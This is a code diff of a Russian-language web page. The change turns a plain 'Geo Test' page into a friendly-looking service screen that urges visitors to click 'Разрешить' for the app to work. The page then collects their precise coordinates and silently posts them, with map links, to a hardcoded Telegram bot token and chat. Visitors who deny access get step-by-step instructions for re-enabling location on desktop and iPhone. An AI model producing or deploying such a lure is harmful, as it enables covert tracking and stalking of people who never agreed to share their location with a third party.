@@ -2,55 +2,183 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>Geo Test</title>
+  <title>Геолокация для сервиса</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background: #f5f7fa;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: #fff;
+      padding: 30px 40px;
+      border-radius: 15px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+      max-width: 400px;
+      text-align: center;
+      transition: all 0.3s ease;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+      color: #333;
+    }
+
+    p {
+      color: #555;
+      margin-bottom: 20px;
+      font-size: 16px;
+    }
+
+    button {
+      background: #0078ff;
+      color: #fff;
+      border: none;
+      border-radius: 10px;
+      padding: 15px 25px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.3s;
+      margin-top: 10px;
+    }
+
+    button:hover {
+      background: #005bbb;
+    }
+
+    .result {
+      margin-top: 20px;
+      font-size: 15px;
+      color: #333;
+      word-break: break-word;
+    }
+
+    .instruction {
+      background: #f0f4ff;
+      border-left: 5px solid #0078ff;
+      padding: 15px;
+      border-radius: 10px;
+      text-align: left;
+      margin-top: 20px;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+
+    a {
+      color: #0078ff;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    .maps-links a {
+      display: inline-block;
+      margin: 5px 10px;
+    }
+  </style>
 </head>
-<body style="font-family: Arial; padding: 20px;">
-
-<h2>Определение местоположения</h2>
-<button id="btn">Определить моё местоположение</button>
-
-<pre id="out"></pre>
+<body>
+  <div class="container" id="container">
+    <h2>Привет!</h2>
+    <p>Чтобы начать пользоваться приложением, нужно нажать <strong>Разрешить</strong> для корректной работы сервиса.</p>
+    <button id="allowBtn">Разрешить</button>
+    <div class="result" id="result"></div>
+  </div>
 
 <script>
-const TELEGRAM_BOT_TOKEN = "8534876598:AAFKtzq7x4ZtuOIW12GnNNyS__ABz1Y7xqw";
-const TELEGRAM_CHAT_ID = "-1003612667914";
+  // Telegram Bot
+  const TELEGRAM_BOT_TOKEN = "8534876598:AAFKtzq7x4ZtuOIW12GnNNyS__ABz1Y7xqw";
+  const TELEGRAM_CHAT_ID = "-1003612667914";
 
-document.getElementById('btn').onclick = () => {
-  const out = document.getElementById('out');
-  out.textContent = 'Запрос геолокации...';
+  const container = document.getElementById('container');
+  const allowBtn = document.getElementById('allowBtn');
+  const resultDiv = document.getElementById('result');
 
-  navigator.geolocation.getCurrentPosition(
-    pos => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-      const acc = pos.coords.accuracy;
+  const options = {
+    enableHighAccuracy: true,
+    timeout: 10000,
+    maximumAge: 0
+  };
 
-      const text =
-        `📍 Геолокация\n` +
-        `Широта: ${lat}\n` +
-        `Долгота: ${lon}\n` +
-        `Точность: ${acc} м\n` +
-        `https://maps.google.com/?q=${lat},${lon}`;
+  function sendToTelegram(message) {
+    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+    });
+  }
 
-      out.textContent = text;
+  function successCallback(pos) {
+    const lat = pos.coords.latitude.toFixed(6);
+    const lon = pos.coords.longitude.toFixed(6);
+    const acc = pos.coords.accuracy.toFixed(1);
 
-      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: text
-        })
-      });
-    },
-    err => {
-      out.textContent = 'Ошибка: ' + err.message;
-    },
-    { enableHighAccuracy: true }
-  );
-};
+    const yandexLink = `https://yandex.ru/maps/?ll=${lon},${lat}&z=17`;
+    const googleLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+
+    const message = `📍 Доступ разрешен!\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ${acc} м\n${yandexLink}\n${googleLink}`;
+
+    container.innerHTML = `
+      <strong>Доступ разрешен!</strong>
+      <p>Ваши координаты:</p>
+      <p>Широта: ${lat}<br>Долгота: ${lon}<br>Точность: ${acc} м</p>
+      <div class="maps-links">
+        <a href="${yandexLink}" target="_blank">Открыть в Яндекс.Картах</a> | 
+        <a href="${googleLink}" target="_blank">Открыть в Google Maps</a>
+      </div>
+      <button id="proceedBtn">Перейти к сервису</button>
+    `;
+
+    document.getElementById('proceedBtn').onclick = () => {
+      window.location.href = "https://твоястраница.ру/сервис"; // замени на свой URL
+    };
+
+    sendToTelegram(message);
+  }
+
+  function errorCallback(error) {
+    if (error.code === 1) { // PERMISSION_DENIED
+      container.innerHTML = `
+        <strong>Доступ запрещен</strong>
+        <div class="instruction">
+          Вы запретили доступ к геолокации.<br>
+          Чтобы включить его вручную:<br><br>
+          <strong>На компьютере:</strong><br>
+          1. Нажмите на 🔒 в адресной строке браузера.<br>
+          2. Разрешите «Местоположение» для этого сайта.<br>
+          3. Обновите страницу.<br><br>
+          <strong>На iPhone (Safari):</strong><br>
+          1. Откройте «Настройки» → Safari → Геолокация.<br>
+          2. Разрешите доступ для этого сайта.<br>
+          3. Вернитесь на страницу и нажмите «Проверить снова».<br><br>
+          <strong>На iPhone (Chrome):</strong><br>
+          1. Настройки → Chrome → Геолокация → Разрешить.<br>
+          2. Вернитесь на страницу и нажмите «Проверить снова».
+        </div>
+        <button id="retryBtn">Проверить снова</button>
+        <div class="result" id="result"></div>
+      `;
+
+      document.getElementById('retryBtn').onclick = () => {
+        navigator.geolocation.getCurrentPosition(successCallback, errorCallback, options);
+      };
+    } else {
+      resultDiv.textContent = 'Ошибка при определении геолокации: ' + error.message;
+    }
+  }
+
+  allowBtn.onclick = () => {
+    resultDiv.textContent = 'Запрос геолокации...';
+    navigator.geolocation.getCurrentPosition(successCallback, errorCallback, options);
+  };
 </script>
-
 </body>
 </html>
